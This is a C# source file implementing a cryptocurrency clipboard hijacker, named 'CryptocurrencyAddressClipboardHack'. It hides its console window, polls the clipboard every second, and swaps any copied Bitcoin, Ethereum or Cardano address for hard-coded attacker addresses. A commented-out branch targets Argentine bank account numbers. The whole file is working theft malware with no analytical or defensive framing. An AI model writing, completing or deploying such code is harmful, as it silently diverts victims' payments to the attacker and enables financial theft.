using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace CryptocurrencyAddressClipboardHack
{
    internal class Program
    {
        static string previousClipboardText = string.Empty;
        
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;

        [STAThread]
        static void Main()
        {
            IntPtr consoleHandle = GetConsoleWindow();//run app in background
            ShowWindow(consoleHandle, SW_HIDE);//run app in background

            Thread clipboardThread = new Thread(MonitorClipboard);
            clipboardThread.SetApartmentState(ApartmentState.STA);
            clipboardThread.Start();

            Console.ReadLine();

            clipboardThread.Abort();
        }

        static void MonitorClipboard()
        {
            while (true)
            {
                string clipboardText = GetClipboardText();

                //Check if clipboard content has changed
                if (!string.IsNullOrEmpty(clipboardText) && clipboardText != previousClipboardText)
                {
                    Console.WriteLine(clipboardText);
                    previousClipboardText = clipboardText;

                    ClipboardSetText(clipboardText);
                }

                Thread.Sleep(1000);//Wait 1 second before checking again
            }
        }

        static string GetClipboardText()
        {
            string clipboardText = string.Empty;

            try
            {
                if (Clipboard.ContainsText())
                {
                    clipboardText = Clipboard.GetText();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error getting clipboard content: " + ex.Message);
            }
            return clipboardText;
        }

        static void ClipboardSetText(string currenText)
        {
            string patternBTC = @"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$";
            string patternETH = @"^0x[0-9a-fA-F]{40}$";
            string patternADA = @"^addr1[0-9a-zA-Z]{58}$";
            string patternArgCBU = @"^\d{22}$";

            if (ValidateCoinAddress(currenText, patternBTC))
            {
                string personalBTCAddress = "bc1qwasv0xvpn7p22txwm502tc7k3l4nkh5ms8nzl3";
                Clipboard.SetText(personalBTCAddress);
            }
            else if (ValidateCoinAddress(currenText, patternETH))
            {
                string personalETHAddress = "0xdE0DC725057EA8a778D19F8fb18b5a210EF617F9";
                Clipboard.SetText(personalETHAddress);
            }
            else if (ValidateCoinAddress(currenText, patternADA))
            {
                string personalADAAddress = "addr1q86glfwk9e8jundn2n7dqeej3dn5lwspepw7g3ftf42yds652rrydnhe2u069ael9ql53lwly8khwzzza9pw6pe8shxsu8mrcp";
                Clipboard.SetText(personalADAAddress);
            }
            else if (ValidateCoinAddress(currenText, patternArgCBU))
            {
                //string personalADAAddress = "1234567890123456789012";
                //Clipboard.SetText(personalADAAddress);
            }
        }

        static bool ValidateCoinAddress(string address, string pattern)
        {
            Regex regex = new Regex(pattern);
            return regex.IsMatch(address);
        }

    }
}